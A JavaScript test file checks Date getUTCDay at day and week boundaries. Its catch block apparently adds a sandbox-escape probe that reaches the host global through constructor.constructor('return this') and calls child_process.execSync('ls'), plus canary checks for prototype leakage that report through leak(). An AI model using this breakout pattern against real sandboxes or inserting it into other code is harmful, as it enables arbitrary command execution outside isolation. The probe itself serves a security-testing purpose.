try {
    var july6 = 1467763200000;
    var july9 = 1468022400000;
    var dayMs = 24 * 60 * 60 * 1000;
    assert.sameValue(new Date(july6).getUTCDay(), 3, 'first millisecond');
    assert.sameValue(new Date(july6 - 1).getUTCDay(), 2, 'previous millisecond');
    assert.sameValue(new Date(july6 + dayMs - 1).getUTCDay(), 3, 'final millisecond');
    assert.sameValue(new Date(july6 + dayMs).getUTCDay(), 4, 'subsequent millisecond');
    assert.sameValue(new Date(july9).getUTCDay(), 6, 'first millisecond (week boundary)');
    assert.sameValue(new Date(july9 - 1).getUTCDay(), 5, 'previous millisecond (week boundary)');
    assert.sameValue(new Date(july9 + dayMs - 1).getUTCDay(), 6, 'final millisecond (week boundary)');
    assert.sameValue(new Date(july9 + dayMs).getUTCDay(), 0, 'subsequent millisecond (week boundary)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}